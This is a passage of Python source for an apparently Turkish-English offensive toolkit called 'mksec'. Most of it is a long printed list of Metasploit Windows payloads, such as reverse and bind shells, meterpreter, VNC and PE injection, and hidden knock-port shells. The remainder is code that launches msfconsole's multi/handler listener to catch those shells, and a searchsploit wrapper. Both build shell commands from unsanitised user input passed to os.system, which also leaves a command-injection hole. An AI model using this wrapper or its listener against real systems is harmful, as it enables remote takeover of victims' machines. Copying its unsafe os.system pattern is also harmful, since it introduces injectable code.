relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connectionfrom a hidden port and spawn a command shell to the allowed host.\nwindows/peinject/bind_ipv6_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for an IPv6 connection (Windows x86)\nwindows/peinject/bind_ipv6_tcp_uuid                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/peinject/bind_named_pipe                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a pipe connection (Windows x86)\nwindows/peinject/bind_nonx_tcp                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection(No NX)\nwindows/peinject/bind_tcp                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection(Windows x86)\nwindows/peinject/bind_tcp_rc4                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connection\nwindows/peinject/bind_tcp_uuid                      Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Listen for a connectionwith UUID Support (Windows x86)\nwindows/peinject/find_tag                           Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Use an established connection\nwindows/peinject/reverse_ipv6_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker over IPv6\nwindows/peinject/reverse_named_pipe                 Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker via a named pipe pivot\nwindows/peinject/reverse_nonx_tcp                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker (No NX)\nwindows/peinject/reverse_ord_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp                        Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_allports               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/peinject/reverse_tcp_dns                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_rc4                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_rc4_dns                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker\nwindows/peinject/reverse_tcp_uuid                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. . Connect back to the attacker with UUID Support\nwindows/pingback_bind_tcp                           Open a socket and report UUID when a connection is received (Windows x86)\nwindows/pingback_reverse_tcp                        Connect back to attacker and report UUID (Windows x86)\nwindows/powershell_bind_tcp                         Listen for a connection and spawn an interactive powershell session\nwindows/powershell_reverse_tcp                      Listen for a connection and spawn an interactive powershell session\nwindows/shell/bind_hidden_ipknock_tcp               Spawn a piped command shell (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method(you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/shell/bind_hidden_tcp                       Spawn a piped command shell (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/shell/bind_ipv6_tcp                         Spawn a piped command shell (staged). Listen for an IPv6 connection (Windows x86)\nwindows/shell/bind_ipv6_tcp_uuid                    Spawn a piped command shell (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/shell/bind_named_pipe                       Spawn a piped command shell (staged). Listen for a pipe connection (Windows x86)\nwindows/shell/bind_nonx_tcp                         Spawn a piped command shell (staged). Listen for a connection (No NX)\nwindows/shell/bind_tcp                              Spawn a piped command shell (staged). Listen for a connection (Windows x86)\nwindows/shell/bind_tcp_rc4                          Spawn a piped command shell (staged). Listen for a connection\nwindows/shell/bind_tcp_uuid                         Spawn a piped command shell (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/shell/find_tag                              Spawn a piped command shell (staged). Use an established connection\nwindows/shell/reverse_ipv6_tcp                      Spawn a piped command shell (staged). Connect back to the attacker over IPv6\nwindows/shell/reverse_nonx_tcp                      Spawn a piped command shell (staged). Connect back to the attacker (No NX)\nwindows/shell/reverse_ord_tcp                       Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp                           Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_allports                  Spawn a piped command shell (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/shell/reverse_tcp_dns                       Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_rc4                       Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_rc4_dns                   Spawn a piped command shell (staged). Connect back to the attacker\nwindows/shell/reverse_tcp_uuid                      Spawn a piped command shell (staged). Connect back to the attacker with UUID Support\nwindows/shell/reverse_udp                           Spawn a piped command shell (staged). Connect back to the attacker with UUID Support\nwindows/shell_bind_tcp                              Listen for a connection and spawn a command shell\nwindows/shell_bind_tcp_xpfw                         Disable the Windows ICF, then listen for a connection and spawn a command shell\nwindows/shell_hidden_bind_tcp                       Listen for a connection from certain IP and spawn a command shell. The shellcode will reply with a RST packet if the connections is not coming from the IP defined in AHOST. This way the port will appear as "closed" helping us to hide the shellcode.\nwindows/shell_reverse_tcp                           Connect back to attacker and spawn a command shell\nwindows/speak_pwned                                 Causes the target to say "You Got Pwned" via the Windows Speech API\nwindows/upexec/bind_hidden_ipknock_tcp              Uploads an executable and runs it (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/upexec/bind_hidden_tcp                      Uploads an executable and runs it (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/upexec/bind_ipv6_tcp                        Uploads an executable and runs it (staged). Listen for an IPv6 connection (Windows x86)\nwindows/upexec/bind_ipv6_tcp_uuid                   Uploads an executable and runs it (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/upexec/bind_named_pipe                      Uploads an executable and runs it (staged). Listen for a pipe connection (Windows x86)\nwindows/upexec/bind_nonx_tcp                        Uploads an executable and runs it (staged). Listen for a connection (No NX)\nwindows/upexec/bind_tcp                             Uploads an executable and runs it (staged). Listen for a connection (Windows x86)\nwindows/upexec/bind_tcp_rc4                         Uploads an executable and runs it (staged). Listen for a connection\nwindows/upexec/bind_tcp_uuid                        Uploads an executable and runs it (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/upexec/find_tag                             Uploads an executable and runs it (staged). Use an established connection\nwindows/upexec/reverse_ipv6_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker over IPv6\nwindows/upexec/reverse_nonx_tcp                     Uploads an executable and runs it (staged). Connect back to the attacker (No NX)\nwindows/upexec/reverse_ord_tcp                      Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp                          Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_allports                 Uploads an executable and runs it (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/upexec/reverse_tcp_dns                      Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_rc4                      Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_rc4_dns                  Uploads an executable and runs it (staged). Connect back to the attacker\nwindows/upexec/reverse_tcp_uuid                     Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support\nwindows/upexec/reverse_udp                          Uploads an executable and runs it (staged). Connect back to the attacker with UUID Support\nwindows/vncinject/bind_hidden_ipknock_tcp           Inject a VNC Dll via a reflective loader (staged). Listen for a connection. First, the port will need to be knocked from the IP defined in KHOST. This IP will work as an authentication method (you can spoof it with tools like hping). After that you could get your shellcode from any IP. The socket will appear as "closed," thus helping to hide the shellcode\nwindows/vncinject/bind_hidden_tcp                   Inject a VNC Dll via a reflective loader (staged). Listen for a connection from a hidden port and spawn a command shell to the allowed host.\nwindows/vncinject/bind_ipv6_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection (Windows x86)\nwindows/vncinject/bind_ipv6_tcp_uuid                Inject a VNC Dll via a reflective loader (staged). Listen for an IPv6 connection with UUID Support (Windows x86)\nwindows/vncinject/bind_named_pipe                   Inject a VNC Dll via a reflective loader (staged). Listen for a pipe connection (Windows x86)\nwindows/vncinject/bind_nonx_tcp                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection (No NX)\nwindows/vncinject/bind_tcp                          Inject a VNC Dll via a reflective loader (staged). Listen for a connection (Windows x86)\nwindows/vncinject/bind_tcp_rc4                      Inject a VNC Dll via a reflective loader (staged). Listen for a connection\nwindows/vncinject/bind_tcp_uuid                     Inject a VNC Dll via a reflective loader (staged). Listen for a connection with UUID Support (Windows x86)\nwindows/vncinject/find_tag                          Inject a VNC Dll via a reflective loader (staged). Use an established connection\nwindows/vncinject/reverse_hop_http                  Inject a VNC Dll via a reflective loader (staged). Tunnel communication over an HTTP or HTTPS hop point. Note that you must first upload data/hop/hop.php to the PHP server you wish to use as a hop.\nwindows/vncinject/reverse_http                      Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows wininet)\nwindows/vncinject/reverse_http_proxy_pstore         Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP\nwindows/vncinject/reverse_ipv6_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker over IPv6\nwindows/vncinject/reverse_nonx_tcp                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker (No NX)\nwindows/vncinject/reverse_ord_tcp                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp                       Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_allports              Inject a VNC Dll via a reflective loader (staged). Try to connect back to the attacker, on all possible ports (1-65535, slowly)\nwindows/vncinject/reverse_tcp_dns                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_rc4                   Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_rc4_dns               Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker\nwindows/vncinject/reverse_tcp_uuid                  Inject a VNC Dll via a reflective loader (staged). Connect back to the attacker with UUID Support\nwindows/vncinject/reverse_winhttp                   Inject a VNC Dll via a reflective loader (staged). Tunnel communication over HTTP (Windows winhttp)\nwindows/x64/exec                                    Execute an arbitrary command (Windows x64)\nwindows/x64/loadlibrary                             Load an arbitrary x64 library path\nwindows/x64/messagebox                              Spawn a dialog via MessageBox using a customizable title, text & icon\nwindows/x64/meterpreter/bind_ipv6_tcp               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection (Windows x64)\nwindows/x64/meterpreter/bind_ipv6_tcp_uuid          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/meterpreter/bind_named_pipe             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a pipe connection (Windows x64)\nwindows/x64/meterpreter/bind_tcp                    Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection (Windows x64)\nwindows/x64/meterpreter/bind_tcp_rc4                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/x64/meterpreter/bind_tcp_uuid               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Listen for a connection with UUID Support (Windows x64)\nwindows/x64/meterpreter/reverse_http                Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/meterpreter/reverse_https               Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/meterpreter/reverse_named_pipe          Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker via a named pipe pivot\nwindows/x64/meterpreter/reverse_tcp                 Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker (Windows x64)\nwindows/x64/meterpreter/reverse_tcp_rc4             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker\nwindows/x64/meterpreter/reverse_tcp_uuid            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/meterpreter/reverse_winhttp             Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTP (Windows x64 winhttp)\nwindows/x64/meterpreter/reverse_winhttps            Inject the meterpreter server DLL via the Reflective Dll Injection payload (staged). Requires Windows XP SP2 or newer. Tunnel communication over HTTPS (Windows x64 winhttp)\nwindows/x64/meterpreter_bind_named_pipe             Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_bind_tcp                    Connect to victim and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_http                Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_https               Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_ipv6_tcp            Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/meterpreter_reverse_tcp                 Connect back to attacker and spawn a Meterpreter shell. Requires Windows XP SP2 or newer.\nwindows/x64/peinject/bind_ipv6_tcp                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for an IPv6 connection (Windows x64)\nwindows/x64/peinject/bind_ipv6_tcp_uuid             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/peinject/bind_named_pipe                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for a pipe connection (Windows x64)\nwindows/x64/peinject/bind_tcp                       Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for a connection(Windows x64)\nwindows/x64/peinject/bind_tcp_rc4                   Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker\nwindows/x64/peinject/bind_tcp_uuid                  Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Listen for a connectionwith UUID Support (Windows x64)\nwindows/x64/peinject/reverse_named_pipe             Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker via a named pipe pivot\nwindows/x64/peinject/reverse_tcp                    Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker (Windows x64)\nwindows/x64/peinject/reverse_tcp_rc4                Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker\nwindows/x64/peinject/reverse_tcp_uuid               Inject a custom native PE file into the exploited process using a reflective PE loader. The reflective PE loader will execute the pre-mapped PE image starting from the address ofentry after performing image base relocation and API address resolution. This module requires a PE file that contains relocation data and a valid (uncorrupted) import table. PE files with CLR(C#/.NET executables), bounded imports, and TLS callbacks are not currently supported. Also PE files which use resource loading might crash. Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/pingback_reverse_tcp                    Connect back to attacker and report UUID (Windows x64)\nwindows/x64/powershell_bind_tcp                     Listen for a connection and spawn an interactive powershell session\nwindows/x64/powershell_reverse_tcp                  Listen for a connection and spawn an interactive powershell session\nwindows/x64/shell/bind_ipv6_tcp                     Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)\nwindows/x64/shell/bind_ipv6_tcp_uuid                Spawn a piped command shell (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/shell/bind_named_pipe                   Spawn a piped command shell (Windows x64) (staged). Listen for a pipe connection (Windows x64)\nwindows/x64/shell/bind_tcp                          Spawn a piped command shell (Windows x64) (staged). Listen for a connection (Windows x64)\nwindows/x64/shell/bind_tcp_rc4                      Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker\nwindows/x64/shell/bind_tcp_uuid                     Spawn a piped command shell (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)\nwindows/x64/shell/reverse_tcp                       Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker (Windows x64)\nwindows/x64/shell/reverse_tcp_rc4                   Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker\nwindows/x64/shell/reverse_tcp_uuid                  Spawn a piped command shell (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/shell_bind_tcp                          Listen for a connection and spawn a command shell (Windows x64)\nwindows/x64/shell_reverse_tcp                       Connect back to attacker and spawn a command shell (Windows x64)\nwindows/x64/vncinject/bind_ipv6_tcp                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection (Windows x64)\nwindows/x64/vncinject/bind_ipv6_tcp_uuid            Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for an IPv6 connection with UUID Support (Windows x64)\nwindows/x64/vncinject/bind_named_pipe               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a pipe connection (Windows x64)\nwindows/x64/vncinject/bind_tcp                      Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection (Windows x64)\nwindows/x64/vncinject/bind_tcp_rc4                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker\nwindows/x64/vncinject/bind_tcp_uuid                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Listen for a connection with UUID Support (Windows x64)\nwindows/x64/vncinject/reverse_http                  Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/vncinject/reverse_https                 Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 wininet)\nwindows/x64/vncinject/reverse_tcp                   Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker (Windows x64)\nwindows/x64/vncinject/reverse_tcp_rc4               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker\nwindows/x64/vncinject/reverse_tcp_uuid              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Connect back to the attacker with UUID Support (Windows x64)\nwindows/x64/vncinject/reverse_winhttp               Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTP (Windows x64 winhttp)\nwindows/x64/vncinject/reverse_winhttps              Inject a VNC Dll via a reflective loader (Windows x64) (staged). Tunnel communication over HTTPS (Windows x64 winhttp)\n""")
                elif "run" == uinput.lower():
                    print("Please wait...")
                    os.system("sudo msfconsole -q -x 'use exploit/multi/handler; set payload " + payload.strip() + "; set lhost " + host.strip() + "; set lport "+ port.strip() + "; exploit'")
                elif "run -f" == uinput.lower():
                    print("Please wait...")
                    os.system("cd /opt/metasploit-framework/ && sudo ./msfconsole -q -x 'use exploit/multi/handler; set payload " + payload.strip() + "; set lhost " + host.strip() + "; set lport "+ port.strip() + "; exploit'")

        create = "          FALSE          "
        listener = "          FALSE          "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[payload_creater_and_listener]\033[37m\x1b[0m ")
            UserInputs(uinput+"exp")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mPayload Creator and Listener is a payload creation and listening tool. This tool uses the Msfvenom and Msfconsole tools. Edited by mksec using the 'exploit/multi/handler' module in the Metasploit tool. \x1b[36m'run'\x1b[37m command does not work, try with \x1b[36m'run -f'\x1b[37m (-f : --force). \n\x1b[33mTR:\x1b[37mPayload Creator and Listener, bir payload oluşturma ve dinleme aracıdır. Bu araç, Msfvenom ve Msfconsole araçlarını kullanır. Metasploit aracı içerisindeki 'exploit/multi/handler' modülünü kullanarak mksec tarafından düzenlenmiştir.\x1b[36m'run'\x1b[37m komutu çalışmazsa \x1b[36m'run -f'\x1b[37m (-f : --force) ile deneyiniz.")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m                \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m               \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nCREATE PAYLOAD   {}     OPT         Set this value to 'TRUE' to create a payload. \x1b[32mDefault value = FALSE\x1b[37m\nPAYLOAD LISTENER {}     OPT         Set this value to 'TRUE' to listen for a payload. \x1b[32mDefault value = FALSE\x1b[37m".format(create,listener))
            elif "set create payload" in uinput.lower():
                create = uinput
                create = create.replace("set create payload ","").replace("set CREATE PAYLOAD ","").replace("SET create payload ","").replace("SET CREATE PAYLOAD ","").center(25).upper()
            elif "set payload listener" in uinput.lower():
                listener = uinput
                listener = listener.replace("set payload listener ","").replace("set PAYLOAD LISTENER ","").replace("SET payload listener ","").replace("SET PAYLOAD LISTENER ","").center(25).upper()
            elif "run" == uinput.lower():
                if create.lower().strip() == "true" and listener.lower().strip() == "false":
                    PayloadCreater()
                elif listener.lower().strip() == "true" and create.lower().strip() == "false":
                    PayloadListener()
                elif create.lower().strip() == "true" and listener.lower().strip() == "true":
                    print('\x1b[1m\x1b[31mYou cannot choose both.')
                else:
                    print("\x1b[1m\x1b[31mYou have not selected one yet\x1b[1m")

    def searchsploit():
        search = "                         "
        while 1:
            uinput = input("\x1b[1m\033[36m[mksec]\033[36m[searchsploit]\033[37m\x1b[0m ")
            UserInputs(uinput+"exp")
            if uinput.lower() == "info":
                print("\x1b[1m\x1b[33mEN:\x1b[37mSearchsploit easily presents exploits found on the system by ExploitDB to us via terminal.\n\x1b[33mTR:\x1b[37mSearchsploit, ExploitDB tarafından sistemde bulunan exploitleri bize kolayca terminal üzerinden sunar. ")
            elif uinput.lower() == "options":
                print("\x1b[1m\x1b[33mOption\x1b[37m     \x1b[33mCurrent Setting\x1b[37m      \x1b[33mRequirement\x1b[37m     \x1b[33mDescription\x1b[37m\n\x1b[33m=======\x1b[37m    \x1b[33m===============\x1b[37m      \x1b[33m===========\x1b[37m     \x1b[33m============\x1b[37m\nSEARCH{}    YES          Type the exploit you want to search \x1b[32mex: ftp\x1b[37m".format(search))
            elif "set search" in uinput.lower():
                search = uinput
                search = search.replace("set search ","").replace("set SEARCH ","").replace("SET search ","").replace("SET SEARCH ","").center(25)
            elif "run" == uinput.lower():
                os.system("searchsploit " + search.strip())

    def macchanger():
        iface = "                         "
        manual = "                         "
